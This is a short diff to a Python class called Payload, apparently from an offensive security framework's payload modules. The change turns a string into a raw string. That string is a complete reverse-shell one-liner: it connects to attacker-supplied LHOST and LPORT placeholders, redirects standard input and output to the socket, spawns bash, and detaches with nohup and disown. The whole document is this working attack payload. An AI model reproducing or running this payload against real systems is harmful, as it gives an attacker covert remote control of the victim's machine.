@@ -23,4 +23,4 @@ class Payload:
 
     attrs = {}
 
-    data = "export LHOST=\"*LHOST*\"; export LPORT=*LPORT*; nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"LHOST\"),int(os.getenv(\"LPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' > /dev/null 2>&1 & disown"
+    data = r"export LHOST=\"*LHOST*\"; export LPORT=*LPORT*; nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"LHOST\"),int(os.getenv(\"LPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' > /dev/null 2>&1 & disown"
